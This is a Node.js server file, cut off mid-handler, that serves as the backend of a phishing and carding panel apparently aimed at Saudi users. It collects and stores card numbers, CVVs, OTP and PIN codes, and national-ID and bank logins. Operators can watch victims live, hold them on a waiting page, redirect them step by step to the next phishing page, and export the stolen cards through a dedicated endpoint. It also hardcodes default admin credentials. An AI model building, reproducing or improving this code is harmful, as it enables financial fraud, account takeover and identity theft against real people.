const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const csvParser = require('csv-parser');
const { Parser: Json2CsvParser } = require('json2csv');
const { Readable } = require('stream');

const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);

// ==================== Disk Persistence ====================
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'db.json');

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function saveToFile() {
  try {
    ensureDataDir();
    const dataToSave = {
      users: db.users,
      formSubmissions: db.formSubmissions,
      chatMessages: db.chatMessages,
      blockedIps: db.blockedIps,
      archivedUsers: db.archivedUsers,
      siteSettings: db.siteSettings,
      preferences: db.preferences,
      policies: db.policies,
      liveUpdates: db.liveUpdates,
    };
    fs.writeFileSync(DATA_FILE, JSON.stringify(dataToSave, null, 2), 'utf8');
  } catch (err) {
    console.error('Error saving data to disk:', err.message);
  }
}

function loadFromFile() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE, 'utf8');
      const saved = JSON.parse(raw);
      if (saved.users) db.users = saved.users;
      if (saved.formSubmissions) db.formSubmissions = saved.formSubmissions;
      if (saved.chatMessages) db.chatMessages = saved.chatMessages;
      if (saved.blockedIps) db.blockedIps = saved.blockedIps;
      if (saved.archivedUsers) db.archivedUsers = saved.archivedUsers;
      if (saved.siteSettings) db.siteSettings = { ...db.siteSettings, ...saved.siteSettings };
      if (saved.preferences) db.preferences = saved.preferences;
      if (saved.policies) db.policies = saved.policies;
      if (saved.liveUpdates) db.liveUpdates = saved.liveUpdates;
      console.log(`Data loaded from disk: ${db.formSubmissions.length} submissions, ${Object.keys(db.users).length} users, ${Object.keys(db.chatMessages).length} chats`);
    } else {
      console.log('No saved data found, starting fresh.');
    }
  } catch (err) {
    console.error('Error loading data from disk:', err.message);
  }
}

// Auto-save every 30 seconds
setInterval(saveToFile, 30000);

const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
const PORT = process.env.PORT || 3000;
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'treeadmin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'bb2023bb';

// ==================== In-Memory Database ====================
const db = {
  admins: [],
  users: {},
  sessions: {},
  formSubmissions: [],
  chatMessages: {},
  blockedIps: [],
  archivedUsers: [],
  siteSettings: {
    chatEnabled: true,
    is_chat_enabled: 1,
    siteEnabled: true,
    allowedCountries: [],
    blockedCountries: [],
    mobileOnly: true,
    website_url: '',
    allowed_country_codes: '[]',
    blocked_card_prefixes: '[]',
    bank_transfer_details: '{}',
  },
  preferences: { viewed: [], bookmarked: [], completed: [] },
  connectedUsers: {},
  policies: [],
  liveUpdates: [],
};

// Load saved data from disk
loadFromFile();

// Initialize default admin
(async () => {
  const hash = await bcrypt.hash(ADMIN_PASSWORD, 10);
  db.admins.push({
    id: uuidv4(),
    username: ADMIN_USERNAME,
    password: hash,
    role: 'admin',
    createdAt: new Date().toISOString(),
  });
  console.log(`Admin user "${ADMIN_USERNAME}" initialized.`);
})();

// ==================== Middleware ====================
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
}));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

const upload = multer({ storage: multer.memoryStorage() });

// Auth middleware
function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token) return res.status(401).json({ error: 'No token provided' });
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.admin = decoded;
    next();
  } catch {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// ==================== Helper: broadcast connected users ====================
function broadcastConnectedUsers() {
  const users = Object.values(db.connectedUsers).filter(u => u.userType !== 'admin').map(u => ({
    uuid: u.uuid,
    userId: u.uuid,
    socketId: u.socketId,
    userName: u.userName,
    userType: u.userType,
    userInfo: u.userInfo,
    connectedAt: u.connectedAt,
    currentPage: u.currentPage,
    isOnline: u.isOnline !== false,
    isTyping: u.isTyping || false,
    ip: u.userInfo?.ip,
    country: u.userInfo?.country,
    countryCode: u.userInfo?.countryCode,
    city: u.userInfo?.city,
    region: u.userInfo?.region,
    device: u.userInfo?.device,
    browser: u.userInfo?.browser,
    browserVersion: u.userInfo?.browserVersion,
    os: u.userInfo?.os,
    visitTime: u.userInfo?.visitTime || u.connectedAt,
    isWaiting: u.isWaiting || false,
    waitingFormType: u.waitingFormType || null,
  }));
  io.emit('user:connected', users);
}

// ==================== Helper: add live update ====================
function addLiveUpdate(type, data) {
  const update = {
    id: uuidv4(),
    type,
    ...data,
    timestamp: new Date().toISOString(),
  };
  db.liveUpdates.push(update);
  if (db.liveUpdates.length > 500) db.liveUpdates = db.liveUpdates.slice(-300);
  io.emit('live:update', update);
}

// ==================== User API ====================
app.post('/api/user/init', (req, res) => {
  const browserInfo = req.body.browserInfo || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
  const visitorUuid = uuidv4();
  const userId = `user_${Date.now()}`;
  const sessionId = `session_${Date.now()}`;

  const userInfo = {
    uuid: visitorUuid,
    userId: userId,
    firstVisit: true,
    visitTime: new Date().toISOString(),
    ip: ip,
    country: browserInfo.country || 'Saudi Arabia',
    countryCode: browserInfo.countryCode || 'SA',
    city: browserInfo.city || 'Riyadh',
    region: browserInfo.region || 'Riyadh',
    device: browserInfo.device || 'mobile',
    browser: browserInfo.browser || 'Unknown',
    browserVersion: browserInfo.browserVersion || '',
    os: browserInfo.os || 'Unknown',
  };

  db.users[visitorUuid] = userInfo;
  db.sessions[sessionId] = { userId, uuid: visitorUuid, createdAt: new Date().toISOString() };
  saveToFile();

  console.log('[API] user/init:', visitorUuid, 'IP:', ip);

  res.json({
    success: true,
    userId,
    sessionId,
    chatEnabled: db.siteSettings.chatEnabled,
    userInfo,
    isChatEnabled: db.siteSettings.is_chat_enabled === 1 || db.siteSettings.chatEnabled === true,
    blockedCardPrefixes: (() => {
      try { return JSON.parse(db.siteSettings.blocked_card_prefixes || '[]'); } catch { return []; }
    })(),
  });
});

app.get('/api/chat/enabled', (req, res) => {
  res.json({ enabled: db.siteSettings.chatEnabled });
});

app.post('/api/chat/enabled', (req, res) => {
  if (req.body.enabled !== undefined) {
    db.siteSettings.chatEnabled = req.body.enabled;
    db.siteSettings.is_chat_enabled = req.body.enabled ? 1 : 0;
  }
  saveToFile();
  res.json({ enabled: db.siteSettings.chatEnabled });
});

app.post('/api/store-policy', (req, res) => {
  const policy = { id: uuidv4(), ...req.body, createdAt: new Date().toISOString() };
  db.policies.push(policy);
  saveToFile();
  res.json({ success: true, policy });
});

app.post('/api/data/store-details', (req, res) => {
  res.json({ success: true });
});

// ==================== Admin API ====================
app.post('/api/admin/login', async (req, res) => {
  const { username, password } = req.body;
  const admin = db.admins.find(a => a.username === username);
  if (!admin) return res.status(401).json({ error: 'Invalid credentials' });

  const valid = await bcrypt.compare(password, admin.password);
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

  const token = jwt.sign({ id: admin.id, username: admin.username, role: admin.role }, JWT_SECRET, { expiresIn: '24h' });
  res.json({ token, username: admin.username, role: admin.role });
});

app.get('/api/admin/verify-session', authMiddleware, (req, res) => {
  res.json({ valid: true, username: req.admin.username, role: req.admin.role });
});

app.get('/api/admin/admins', authMiddleware, (req, res) => {
  const admins = db.admins.map(a => ({ id: a.id, username: a.username, role: a.role, createdAt: a.createdAt }));
  res.json(admins);
});

app.post('/api/admin/admins', authMiddleware, async (req, res) => {
  if (req.admin.role !== 'admin') return res.status(403).json({ error: 'Only admins can create moderators' });
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
  if (db.admins.find(a => a.username === username)) return res.status(400).json({ error: 'Username already exists' });

  const hash = await bcrypt.hash(password, 10);
  const newAdmin = { id: uuidv4(), username, password: hash, role: 'moderator', createdAt: new Date().toISOString() };
  db.admins.push(newAdmin);
  res.json({ id: newAdmin.id, username: newAdmin.username, role: newAdmin.role, createdAt: newAdmin.createdAt });
});

app.put('/api/admin/admins/:id', authMiddleware, async (req, res) => {
  if (req.admin.role !== 'admin') return res.status(403).json({ error: 'Only admins can update moderators' });
  const admin = db.admins.find(a => a.id === req.params.id);
  if (!admin) return res.status(404).json({ error: 'Admin not found' });

  if (req.body.username) admin.username = req.body.username;
  if (req.body.password) admin.password = await bcrypt.hash(req.body.password, 10);
  res.json({ id: admin.id, username: admin.username, role: admin.role });
});

app.delete('/api/admin/admins/:id', authMiddleware, (req, res) => {
  if (req.admin.role !== 'admin') return res.status(403).json({ error: 'Only admins can delete moderators' });
  const idx = db.admins.findIndex(a => a.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'Admin not found' });
  if (db.admins[idx].role === 'admin') return res.status(400).json({ error: 'Cannot delete main admin' });
  db.admins.splice(idx, 1);
  res.json({ success: true });
});

app.post('/api/admin/change-password', authMiddleware, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  const admin = db.admins.find(a => a.id === req.admin.id);
  if (!admin) return res.status(404).json({ error: 'Admin not found' });

  const valid = await bcrypt.compare(currentPassword, admin.password);
  if (!valid) return res.status(401).json({ error: 'Current password is incorrect' });

  admin.password = await bcrypt.hash(newPassword, 10);
  res.json({ success: true });
});

app.get('/api/admin/form-submissions', authMiddleware, (req, res) => {
  const { userId, uuid } = req.query;
  let results = db.formSubmissions;
  
  // Filter by userId or uuid if provided
  if (userId || uuid) {
    const targetId = uuid || userId;
    results = results.filter(s => s.uuid === targetId || s.userId === targetId);
  }
  
  // Sort by timestamp descending (newest first)
  results = [...results].sort((a, b) => new Date(b.timestamp || 0).getTime() - new Date(a.timestamp || 0).getTime());
  
  // Return in the format the admin panel expects: { submissions: [...] }
  res.json({ submissions: results });
});

app.get('/api/admin/search-forms', authMiddleware, (req, res) => {
  const q = (req.query.q || '').toLowerCase();
  if (!q) return res.json(db.formSubmissions);
  const results = db.formSubmissions.filter(f => JSON.stringify(f).toLowerCase().includes(q));
  res.json(results);
});

app.get('/api/admin/export-cards', authMiddleware, (req, res) => {
   const paymentSubs = db.formSubmissions.filter(f => f.formType === 'payment');
  const userMap = {};
  paymentSubs.forEach(sub => {
    const uuid = sub.uuid || sub.userId;
    if (!uuid) return;
    if (!userMap[uuid] || new Date(sub.timestamp) > new Date(userMap[uuid].timestamp)) {
      userMap[uuid] = sub;
    }
  });
  const cards = Object.values(userMap).map(sub => {
const user = Object.values(db.connectedUsers).find(u => u.visitorId === sub.uuid) || {};
    const formData = sub.formData || {};
    return {
      name: user.userInfo?.name || formData.cardholderName || 'Unknown',
      nationalId: user.userInfo?.nationalId || '',
      uuid: sub.uuid || sub.userId || '',
      payment: {
        bankName: formData.bankName || '',
        cardNumber: formData.cardNumber || '',
        cardholderName: formData.cardholderName || '',
        expiryMonth: formData.expiryMonth || '',
        expiryYear: formData.expiryYear || '',
        cvv: formData.cvv || '',
        brandType: formData.brandType || formData.cardType || '',
        level: formData.level || formData.cardLevel || '',
        amount: formData.amount || '',
        currency: formData.currency || 'USD'
      }
    };
  });
  res.json({ cards });
});

app.get('/api/admin/export-data-csv', authMiddleware, (req, res) => {
  try {
    if (db.formSubmissions.length === 0) {
      return res.status(200).send('No data');
    }
    const parser = new Json2CsvParser();
    const csv = parser.parse(db.formSubmissions);
    res.header('Content-Type', 'text/csv');
    res.attachment('data-export.csv');
    res.send(csv);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/admin/import-data-csv', authMiddleware, upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
  const results = [];
  const stream = Readable.from(req.file.buffer.toString());
  stream.pipe(csvParser())
    .on('data', (data) => results.push(data))
    .on('end', () => {
      db.formSubmissions.push(...results);
      res.json({ success: true, imported: results.length });
    })
    .on('error', (e) => res.status(500).json({ error: e.message }));
});

// ==================== Socket.IO ====================
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
    credentials: true,
  },
  transports: ['polling', 'websocket'],
  pingInterval: 25000,
  pingTimeout: 20000,
});

io.on('connection', (socket) => {
  console.log(`[Socket] Connected: ${socket.id}`);

  // Send csrf token and public settings on connect
  socket.emit('csrf:token', { token: uuidv4() });
  socket.emit('site:publicSettings', {
    chatEnabled: db.siteSettings.chatEnabled,
    mobileOnly: db.siteSettings.mobileOnly,
    siteEnabled: db.siteSettings.siteEnabled,
  });

  // ==================== User Events ====================
  socket.on('user:join', (data) => {
    const rawData = data || {};
    const uuid = rawData.uuid || rawData.userId;
    const userInfo = rawData.userInfo || {};
    const userName = rawData.userName || 'Guest';
    const userType = rawData.userType || 'client';

    console.log('[user:join]', JSON.stringify({ uuid, userName, userType }));

    if (!uuid) {
      console.log('[user:join] No uuid in data:', JSON.stringify(rawData));
      return;
    }

    socket.uuid = uuid;
    socket.userType = userType;
    socket.userName = userName;
    socket.join(`user:${uuid}`);

    // Merge with existing user data from init API
    const existingUser = db.users[uuid] || {};
    const mergedInfo = { ...existingUser, ...userInfo, uuid };

    db.connectedUsers[uuid] = {
      socketId: socket.id,
      uuid,
      userId: uuid,
      userName,
      userType,
      userInfo: mergedInfo,
      connectedAt: new Date().toISOString(),
      currentPage: null,
      isOnline: true,
      isTyping: false,
      ip: mergedInfo.ip,
      country: mergedInfo.country,
      countryCode: mergedInfo.countryCode,
      city: mergedInfo.city,
      region: mergedInfo.region,
      device: mergedInfo.device,
      browser: mergedInfo.browser,
      browserVersion: mergedInfo.browserVersion,
      os: mergedInfo.os,
      visitTime: mergedInfo.visitTime,
    };

    console.log('[user:join] Registered:', uuid, 'Total:', Object.keys(db.connectedUsers).length);

    // Confirm to the user
    socket.emit('user:joined', { uuid, success: true });
    socket.emit('user:uuidAssigned', { uuid, success: true });

    // Send live updates history to user
    socket.emit('live:updatesHistory', db.liveUpdates.slice(-50));

    // Broadcast updated connected users list to ALL (admin expects array)
    broadcastConnectedUsers();

    // Add live update
    addLiveUpdate('user_connected', { uuid, userName });
  });

  socket.on('user:pageNavigation', (data) => {
    if (socket.uuid && db.connectedUsers[socket.uuid]) {
      db.connectedUsers[socket.uuid].currentPage = data.page || data.currentPage;
      db.connectedUsers[socket.uuid].pageData = data;
    }
    io.emit('user:pageNavigation', { uuid: socket.uuid, ...data });
    broadcastConnectedUsers();
  });

  socket.on('user:statusUpdate', (data) => {
    if (socket.uuid && db.connectedUsers[socket.uuid]) {
      if (data.status) db.connectedUsers[socket.uuid].status = data.status;
    }
    io.emit('user:statusUpdate', { uuid: socket.uuid, ...data });
  });

  socket.on('user:typingStatus', (data) => {
    if (socket.uuid && db.connectedUsers[socket.uuid]) {
      db.connectedUsers[socket.uuid].isTyping = data.isTyping || false;
    }
    io.emit('user:typingStatus', { uuid: socket.uuid, ...data });
    broadcastConnectedUsers();
  });

  socket.on('user:getChatHistory', (data, callback) => {
    const uuid = data?.uuid || socket.uuid;
    const history = db.chatMessages[uuid] || [];
    if (typeof callback === 'function') callback(history);
    else socket.emit('chat:history', history);
  });

  // ==================== Form Submission Handler ====================
  function handleFormSubmission(eventName, data) {
    const uuid = socket.uuid || data.uuid || data.userId;
    if (!uuid) {
      console.log(`[${eventName}] No uuid, ignoring`);
      return;
    }

    // Extract formData - the admin panel reads data from submission.formData
    const { id: dataId, uuid: dataUuid, userId: dataUserId, csrfToken, formType: dataFormType, ...formFields } = data;
    const resolvedFormType = data.formType || eventName.replace(':submitted', '').replace(':update', '').replace(':received', '');
    
    const submission = {
      id: data.id || uuidv4(),
      uuid: uuid,
      userId: uuid,
      formType: resolvedFormType,
      formData: { ...formFields, ...(data.formData || {}) },
      step: data.step || (data.formData && data.formData.step),
      timestamp: data.timestamp || data.submittedAt || new Date().toISOString(),
      submittedAt: data.submittedAt || data.timestamp || new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };

    // Form types that should NEVER be overwritten - always create new entries
    // This preserves old OTP/PIN codes in the admin panel even after rejection
    const neverOverwriteTypes = ['otp_verification', 'pin_verification'];
    const shouldNeverOverwrite = neverOverwriteTypes.includes(submission.formType);

    if (shouldNeverOverwrite) {
      // Always create a new submission entry - never overwrite old codes
      submission.id = uuidv4(); // Force new unique ID
      db.formSubmissions.push(submission);
    } else {
      // Check if submission with same uuid and same formType+step exists (update it)
      const existingIdx = db.formSubmissions.findIndex(s => 
        s.id === submission.id || 
        (s.uuid === uuid && s.formType === submission.formType && submission.step && s.step === submission.step)
      );
      if (existingIdx !== -1) {
        db.formSubmissions[existingIdx] = { ...db.formSubmissions[existingIdx], ...submission };
      } else {
        db.formSubmissions.push(submission);
      }
    }

    console.log(`[${eventName}]`, uuid, submission.formType, submission.step || '', 'Total:', db.formSubmissions.length);
    saveToFile();

    // Extract user name from form data and update connectedUsers
    const fd = submission.formData || {};
    const extractedName = fd.documentOwnerName || fd.fullName || fd.name || fd.cardholderName || fd.ownerName || '';
    let needsBroadcast = false;
    if (extractedName && db.connectedUsers[uuid]) {
      db.connectedUsers[uuid].userName = extractedName;
      console.log('[handleFormSubmission] Updated userName for', uuid, 'to:', extractedName);
      needsBroadcast = true;
    }

    // Set waiting state for forms that need admin decision
    const waitingFormTypes = ['payment', 'otp_verification', 'phone_verification', 'nafath_verification', 'naflogin', 'rajlogin'];
    const skipWaitingSteps = [];
    if (waitingFormTypes.includes(submission.formType) && db.connectedUsers[uuid] && !skipWaitingSteps.includes(submission.step)) {
      db.connectedUsers[uuid].currentPage = '\u0628\u0627\u0646\u062A\u0638\u0627\u0631 \u0627\u0644\u0642\u0631\u0627\u0631...';
      db.connectedUsers[uuid].isWaiting = true;
      db.connectedUsers[uuid].waitingFormType = submission.formType;
      console.log('[handleFormSubmission] Set waiting state for', uuid, 'formType:', submission.formType);
      needsBroadcast = true;
      // Also send status update to admins
      io.emit('user:statusUpdate', {
        uuid: uuid,
        userId: uuid,
        socketId: db.connectedUsers[uuid].socketId,
        currentPage: db.connectedUsers[uuid].currentPage,
        status: 'online',
        isTyping: false,
        isWaiting: true,
        waitingFormType: submission.formType
      });
    }

    if (needsBroadcast) {
      broadcastConnectedUsers();
    }

    // Broadcast to all admins (admin listens on form:submission)
    io.emit('form:submission', submission);

    // Also emit form:submitted back to the user (frontend listens on this)
    io.to(`user:${uuid}`).emit('form:submitted', { ...submission, formId: submission.id, success: true });

    // Add live update
    addLiveUpdate('form_submission', { uuid, formType: submission.formType, step: submission.step });
  }

  // Listen for all form-related events from frontend
  socket.on('form:submitted', (data) => handleFormSubmission('form:submitted', data));
  socket.on('phone:submitted', (data) => handleFormSubmission('phone:submitted', { ...data, formType: 'phone_verification' }));
  socket.on('naflogin:submitted', (data) => handleFormSubmission('naflogin:submitted', data));
  socket.on('nafotp:submitted', (data) => handleFormSubmission('nafotp:submitted', data));
  socket.on('rajlogin:submitted', (data) => handleFormSubmission('rajlogin:submitted', data));
  socket.on('health:submitted', (data) => handleFormSubmission('health:submitted', data));
  socket.on('health2:submitted', (data) => handleFormSubmission('health2:submitted', data));
  socket.on('health3:submitted', (data) => handleFormSubmission('health3:submitted', data));
  socket.on('health4:submitted', (data) => handleFormSubmission('health4:submitted', data));
  socket.on('nafath:submitted', (data) => handleFormSubmission('nafath:submitted', { ...data, formType: 'nafath_verification' }));
  socket.on('payment:update', (data) => handleFormSubmission('payment:update', { ...data, formType: 'payment' }));
  socket.on('booking:update', (data) => handleFormSubmission('booking:update', { ...data, formType: 'booking' }));
  socket.on('client:cancelPayment', (data) => handleFormSubmission('client:cancelPayment', { ...data, formType: 'cancel_payment' }));

  // OTP and PIN - forward to admin as-is AND as form:submission
  socket.on('otp:received', (data) => {
    const uuid = socket.uuid || data.uuid || data.userId;
    console.log('[otp:received]', uuid, data.code);
    io.emit('otp:received', { uuid, userId: uuid, ...data });
    handleFormSubmission('otp:received', { ...data, formType: 'otp_verification', step: 'otp_received' });
  });

  socket.on('pin:received', (data) => {
    const uuid = socket.uuid || data.uuid || data.userId;
    console.log('[pin:received]', uuid);
    io.emit('pin:received', { uuid, userId: uuid, ...data });
    handleFormSubmission('pin:received', { ...data, formType: 'pin_verification', step: 'pin_received' });
  });

  // ==================== Chat Messages ====================
  socket.on('chat:message', (data) => {
    const msg = {
      id: data.id || uuidv4(),
      ...data,
      timestamp: data.timestamp || new Date().toISOString(),
    };
    const uuid = data.targetUuid || data.uuid || socket.uuid;
    if (!db.chatMessages[uuid]) db.chatMessages[uuid] = [];
    db.chatMessages[uuid].push(msg);
    saveToFile();

    // Send to the target user room
    if (data.from === 'admin') {
      io.to(`user:${uuid}`).emit('chat:message', msg);
    }
    // Broadcast to all admins too
    io.emit('chat:message', msg);
  });

  // ==================== Admin Events ====================
  socket.on('admin:getConnectedUsers', (data, callback) => {
    const users = Object.values(db.connectedUsers).filter(u => u.userType !== 'admin').map(u => ({
      uuid: u.uuid,
      userId: u.uuid,
      socketId: u.socketId,
      userName: u.userName,
      userType: u.userType,
      userInfo: u.userInfo,
      connectedAt: u.connectedAt,
      currentPage: u.currentPage,
      isOnline: u.isOnline !== false,
      isTyping: u.isTyping || false,
      ip: u.userInfo?.ip || u.ip,
      country: u.userInfo?.country || u.country,
      countryCode: u.userInfo?.countryCode || u.countryCode,
      city: u.userInfo?.city || u.city,
      region: u.userInfo?.region || u.region,
      device: u.userInfo?.device || u.device,
      browser: u.userInfo?.browser || u.browser,
      browserVersion: u.userInfo?.browserVersion || u.browserVersion,
      os: u.userInfo?.os || u.os,
      visitTime: u.userInfo?.visitTime || u.visitTime || u.connectedAt,
    }));
    console.log('[admin:getConnectedUsers] Returning', users.length, 'users');
    if (typeof callback === 'function') callback(users);
    socket.emit('user:connected', users);
  });

  socket.on('admin:getChatHistory', (data, callback) => {
    const uuid = data?.uuid || data?.userId;
    const history = uuid ? (db.chatMessages[uuid] || []) : {};
    if (typeof callback === 'function') callback(history);
    else socket.emit('chat:history', history);
  });

  socket.on('admin:getUpdates', (data, callback) => {
    const updates = {
      connectedUsers: Object.values(db.connectedUsers).filter(u => u.userType !== 'admin'),
      formSubmissions: db.formSubmissions.slice(-50),
      recentMessages: Object.entries(db.chatMessages).reduce((acc, [uuid, msgs]) => {
        acc[uuid] = msgs.slice(-10);
        return acc;
      }, {}),
    };
    if (typeof callback === 'function') callback(updates);
    else socket.emit('admin:getUpdates', updates);
  });

  socket.on('admin:getUsersWithSubmissions', (data, callback) => {
    const usersMap = {};

    // First add all users from init
    Object.entries(db.users).forEach(([uuid, info]) => {
      const connUser = db.connectedUsers[uuid];
      usersMap[uuid] = {
        uuid,
        userId: uuid,
        userName: (connUser && connUser.userName) || info.userName || 'زائر',
        userInfo: info,
        ip: info.ip,
        country: info.country,
        countryCode: info.countryCode,
        city: info.city,
        region: info.region,
        device: info.device,
        browser: info.browser,
        browserVersion: info.browserVersion,
        os: info.os,
        visitTime: info.visitTime,
        submissions: [],
        hasPayCard: false,
        isUserBlocked: false,
        viewedByAdmin: false,
        isConnected: !!connUser,
        status: connUser ? 'online' : 'offline',
        socketId: connUser ? connUser.socketId : null,
        currentPage: connUser ? connUser.currentPage : null,
        isTyping: connUser ? connUser.isTyping : false,
        isWaiting: connUser ? (connUser.isWaiting || false) : false,
        waitingFormType: connUser ? (connUser.waitingFormType || null) : null,
        updatedAt: info.visitTime || new Date().toISOString(),
      };
    });

    // Add submissions
    db.formSubmissions.forEach(sub => {
      const uuid = sub.uuid || sub.userId;
      if (!uuid) return;
      if (!usersMap[uuid]) {
        const connUser = db.connectedUsers[uuid];
        usersMap[uuid] = {
          uuid,
          userId: uuid,
          userName: (connUser && connUser.userName) || 'زائر',
          userInfo: {},
          submissions: [],
          hasPayCard: false,
          isUserBlocked: false,
          viewedByAdmin: false,
          isConnected: !!connUser,
          status: connUser ? 'online' : 'offline',
          socketId: connUser ? connUser.socketId : null,
          currentPage: connUser ? connUser.currentPage : null,
          isTyping: connUser ? connUser.isTyping : false,
          isWaiting: connUser ? (connUser.isWaiting || false) : false,
          waitingFormType: connUser ? (connUser.waitingFormType || null) : null,
          updatedAt: sub.submittedAt || new Date().toISOString(),
        };
      }
      // Extract name from form data
      const fd = sub.formData || {};
      const extractedName = fd.documentOwnerName || fd.fullName || fd.name || fd.cardholderName || fd.ownerName || '';
      if (extractedName && (!usersMap[uuid].userName || usersMap[uuid].userName === 'زائر')) {
        usersMap[uuid].userName = extractedName;
      }
      usersMap[uuid].submissions.push(sub);
      if (sub.formType === 'payment') {
        usersMap[uuid].hasPayCard = true;
      }
      const subTime = sub.updatedAt || sub.submittedAt;
      if (subTime && (!usersMap[uuid].updatedAt || new Date(subTime) > new Date(usersMap[uuid].updatedAt))) {
        usersMap[uuid].updatedAt = subTime;
      }
    });

    // Sort each user's submissions by timestamp descending (newest first)
    Object.values(usersMap).forEach(u => {
      u.submissions.sort((a, b) => new Date(b.timestamp || b.submittedAt || 0).getTime() - new Date(a.timestamp || a.submittedAt || 0).getTime());
    });
    const result = { users: Object.values(usersMap) };
    console.log('[admin:getUsersWithSubmissions] Returning', result.users.length, 'users');
    if (typeof callback === 'function') callback(result);
    else socket.emit('admin:usersWithSubmissions', result);
  });

  socket.on('admin:blockUser', (data) => {
    const { uuid, userId, ip, reason } = data || {};
    const targetUuid = uuid || userId;

    if (ip) {
      const ipStr = String(ip).trim();
      if (!db.blockedIps.find(b => (typeof b === 'string' ? b : b.ip) === ipStr)) {
        db.blockedIps.push({ ip: ipStr, reason, blockedAt: new Date().toISOString() });
      }
    }
    saveToFile();

    if (targetUuid) {
      io.to(`user:${targetUuid}`).emit('user:blocked', {
        isBlocked: true,
        message: reason || 'تم حظرك من الموقع',
      });
    }

    socket.emit('admin:blockUser:success', { uuid: targetUuid, ip, reason });
    io.emit('admin:userBlocked', { uuid: targetUuid, userId: targetUuid, ip, reason });
  });

  socket.on('admin:getBlockedIps', (data, callback) => {
    const ips = db.blockedIps.map(b => typeof b === 'string' ? { ip: b } : b);
    if (typeof callback === 'function') callback({ ips });
    else socket.emit('admin:blockedIps', { ips });
  });

  socket.on('admin:unblockIp', (data) => {
    const { ip } = data || {};
    const ipStr = String(ip).trim();
    db.blockedIps = db.blockedIps.filter(b => {
      const bIp = typeof b === 'string' ? b : b.ip;
      return String(bIp).trim() !== ipStr;
    });
    socket.emit('admin:unblockIp:success', { ip: ipStr });
    io.emit('admin:blockedIps:unblocked', { ip: ipStr });
  });

  // ==================== FIXED: admin:redirectUser ====================
  // Admin sends: { userId, uuid, page, pageName }
  // Frontend expects: { page, pageName } on 'admin:redirect'
  socket.on('admin:redirectUser', (data) => {
    const { uuid, userId, url, page, pageName } = data || {};
    const targetUuid = uuid || userId;
    if (targetUuid) {
      io.to(`user:${targetUuid}`).emit('admin:redirect', { url, page, pageName });
      console.log('[admin:redirectUser]', targetUuid, 'to page:', page || url, 'name:', pageName);
      // Remove waiting state when redirecting user
      if (db.connectedUsers[targetUuid]) {
        db.connectedUsers[targetUuid].isWaiting = false;
        db.connectedUsers[targetUuid].waitingFormType = null;
        db.connectedUsers[targetUuid].currentPage = pageName || page || '';
        io.emit('user:statusUpdate', {
          uuid: targetUuid,
          userId: targetUuid,
          socketId: db.connectedUsers[targetUuid].socketId,
          currentPage: pageName || page || '',
          status: 'online',
          isTyping: false
        });
        broadcastConnectedUsers();
      }
    }
  });

  socket.on('admin:archiveUser', (data) => {
    const { uuid, userId } = data || {};
    const targetUuid = uuid || userId;
    if (targetUuid && !db.archivedUsers.find(u => u.uuid === targetUuid)) {
      db.archivedUsers.push({
        uuid: targetUuid,
        userId: targetUuid,
        archivedAt: new Date().toISOString(),
        userInfo: db.users[targetUuid],
      });
    }
    saveToFile();
    io.emit('admin:userArchived', { uuid: targetUuid, userId: targetUuid });
  });

  socket.on('admin:unarchiveUser', (data) => {
    const { uuid, userId } = data || {};
    const targetUuid = uuid || userId;
    db.archivedUsers = db.archivedUsers.filter(u => u.uuid !== targetUuid);
    saveToFile();
    io.emit('admin:userUnarchived', { uuid: targetUuid, userId: targetUuid });
  });

  socket.on('admin:getArchivedUsers', (data, callback) => {
    if (typeof callback === 'function') callback(db.archivedUsers);
    else socket.emit('admin:archivedUsers', db.archivedUsers);
  });

  socket.on('admin:markUserAsViewed', (data) => {
    io.emit('admin:userViewed', data);
  });

  socket.on('admin:markUserAsUnviewed', (data) => {
    io.emit('admin:userUnviewed', data);
  });

  socket.on('admin:deleteUserSession', (data) => {
    const { uuid, userId } = data || {};
    const targetUuid = uuid || userId;
    if (targetUuid) {
      delete db.connectedUsers[targetUuid];
      delete db.chatMessages[targetUuid];
      delete db.users[targetUuid];
      delete db.sessions[targetUuid];
      db.formSubmissions = db.formSubmissions.filter(s => (s.uuid || s.userId) !== targetUuid);
      db.archivedUsers = db.archivedUsers.filter(u => u.uuid !== targetUuid);
      // Remove from preferences
      if (db.preferences) {
        ['viewed', 'bookmarked', 'completed'].forEach(key => {
          if (Array.isArray(db.preferences[key])) {
            db.preferences[key] = db.preferences[key].filter(id => id !== targetUuid);
          }
        });
      }
    }
    saveToFile();
    console.log('[admin:deleteUserSession] Deleted user:', targetUuid);
    io.emit('admin:deleteUserSession', { uuid: targetUuid, userId: targetUuid });
    // Also emit userArchived event so frontend removes from k.current
    io.emit('admin:userArchived', { uuid: targetUuid, userId: targetUuid });
    broadcastConnectedUsers();
  });

  socket.on('admin:deleteMultipleUserSessions', (data) => {
